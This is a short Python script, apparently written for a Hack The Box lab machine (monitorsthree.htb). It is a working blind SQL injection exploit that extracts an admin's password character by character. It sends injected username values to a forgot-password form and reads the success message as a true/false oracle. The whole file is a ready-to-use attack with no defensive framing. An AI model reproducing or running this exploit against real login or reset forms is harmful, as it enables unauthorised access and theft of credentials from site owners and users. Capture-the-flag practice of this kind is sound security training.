# it will brute force admin password by blind sql query basically guess password on server responses

import string
import requests

URL = 'http://monitorsthree.htb/forgot_password.php'
CHARSET = string.ascii_letters + string.digits + "_" 
SUCCESS = 'Successfully sent password'
PAYLOAD = "admin' AND SUBSTR(password,{},1)='{}' -- -"


password = ''
session = requests.Session()  # Using single session for efficiency
try:
    while True:
        found_char = False 
        for char in CHARSET:
            password_i = len(password) + 1
            payload_data = {'username': PAYLOAD.format(password_i, char)}
         
            resp = session.post(URL, data=payload_data)
            print(f'\r[{password_i}] {password}{char}', end='')  
            if SUCCESS in resp.text:
                password += char
                found_char = True
                break
        if not found_char:
          
            break
    print(f'\nExtracted Password: {password}')
except Exception as e:
    print(f'\nError: {e}')
finally:
    session.close()  # Ensure session is closed
